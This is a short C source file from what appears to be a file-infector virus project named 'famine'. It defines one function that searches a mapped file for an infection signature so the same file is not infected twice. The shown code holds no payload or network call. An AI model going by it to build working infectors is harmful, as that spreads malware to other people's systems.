#include "famine.h"

#include <stddef.h> // NULL
#include <string.h> // memmem()

int is_file_infected(t_file *file)
{
	if (file->size < SIGNATURE_SIZE)
		return (0);

	return (memmem(file->map, file->size, SIGNATURE, SIGNATURE_SIZE)
	        != NULL);
}
